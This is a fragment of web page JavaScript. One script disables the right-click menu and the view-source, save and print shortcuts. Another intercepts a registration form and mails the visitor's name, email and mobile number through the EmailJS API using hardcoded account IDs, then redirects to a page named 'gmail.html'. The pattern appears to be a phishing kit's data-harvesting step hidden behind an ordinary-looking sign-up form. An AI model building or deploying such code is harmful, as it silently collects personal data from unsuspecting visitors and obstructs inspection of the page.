        <script>
            document.addEventListener("contextmenu", (e) => e.preventDefault());
    
            document.addEventListener("keydown", (e) => {
                if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'p')) {
                    e.preventDefault();
                }
            });
        </script>


        <script type="text/javascript">
            document.getElementById("form-register").addEventListener("submit", function(event){
            event.preventDefault();
            var mobile = document.getElementById("mobile").value;
            localStorage.setItem('mobile', JSON.stringify(mobile));
            
            var data = {
                service_id: 'service_4a8grop',
                template_id: 'template_5abs6p4',
                user_id: 'Ct3xYBH_v2Glf8LKZ',
                template_params: {
                    name: document.getElementById("fname").value + " " + document.getElementById("lname").value,
                    email: document.getElementById("email").value,
                    subject: "NEW USER",
                    message: "Email:" + document.getElementById("email").value + " " + "Mobile:" + mobile ,
                }
            };
            
            $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
                type: 'POST',
                data: JSON.stringify(data),
                contentType: 'application/json'
            }).done(function() {
                window.location.href='./gmail.html';
            }).fail(function(error) {
                alert('Oops... ' + JSON.stringify(error));
            });
            

        });
    </script>
